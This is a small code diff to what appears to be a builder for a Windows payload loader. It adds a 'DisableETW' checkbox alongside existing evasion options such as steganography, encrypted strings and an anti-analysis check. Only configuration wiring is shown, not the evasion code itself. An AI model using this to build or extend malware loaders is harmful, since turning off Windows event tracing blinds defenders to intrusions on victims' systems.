@@ -173,6 +173,7 @@ static BOOLEAN trick_SxInDll = {sx_trick};
 static AllocateMethod allocateMethod = {alloc_method};
 static BOOLEAN checkVXQQ = {check_VXQQ};
 static BOOLEAN EnableSteg = {enable_steg};
+static BOOLEAN DisableETW = {enable_disableETW};
 static BOOLEAN EnableMultiplePayloadControl = {enable_payloadControl};
 static wchar_t const* stegPath = ENCRYPT_WSTR("\\\\{steg_path}");
 // ==================== CONFIG END ==========================
@@ -189,6 +190,7 @@ static wchar_t const* stegPath = ENCRYPT_WSTR("\\\\{steg_path}");
             check_VXQQ='TRUE' if settings['check_VXQQ'] else 'FALSE',
             alloc_method=settings['alloc_method'],
             enable_steg='TRUE' if settings['enable_steg'] else 'FALSE',
+            enable_disableETW='TRUE' if settings['enable_disableETW'] else 'FALSE',
             enable_payloadControl='TRUE' if settings['enable_payloadControl'] else 'FALSE',
             steg_path=settings['steg_path'] if settings['steg_path'] else ""
         )
@@ -210,6 +212,7 @@ static wchar_t const* stegPath = ENCRYPT_WSTR("\\\\{steg_path}");
             'check_VXQQ': window.vxqq_check.isChecked(),
             'alloc_method': window.alloc_combo.currentText(),
             'enable_steg': window.steg_check.isChecked(),
+            'enable_disableETW': window.disable_etw_check.isChecked(),
             'enable_payloadControl': window.payloadControl_check.isChecked(),
             'steg_path': window.steg_name.text()
         }
